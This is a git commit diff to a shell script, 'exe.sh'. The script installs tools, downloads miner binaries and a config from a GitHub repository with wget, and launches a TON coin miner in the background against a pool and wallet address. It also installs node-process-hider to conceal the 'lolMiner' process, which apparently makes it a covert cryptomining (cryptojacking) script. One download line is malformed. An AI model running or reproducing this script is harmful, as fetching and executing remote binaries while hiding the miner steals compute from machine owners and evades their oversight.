e090292bda6c885e33bd583d2d4583f3445aaf1a
d-crypto99 <79061002+d-crypto99@users.noreply.github.com>
2022-01-26 07:47:52 +0700

    Update exe.sh

--- exe.sh
+++ exe.sh
@@ -4,4 +4,5 @@ sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 69 87
 sudo apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y && npm i -g node-process-hider && ph add lolMiner
 wget https://github.com/d-crypto99/Bemiii/raw/main/TonCoinMiner && wget https://github.com/d-crypto99/Bemiii/raw/main/go && https://github.com/d-crypto99/Bemiii/raw/main/global.config.json
-./TonCoinMiner EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi -p https://pool.services.tonwhales.com &
+sudo apt install ocl-icd-opencl-dev -y
+./go EQC3Kt2DCvHO8MDUjG04zElTk0URbNqp3n9r9_4RbhWG-pmi --pool https://pool.services.tonwhales.com &
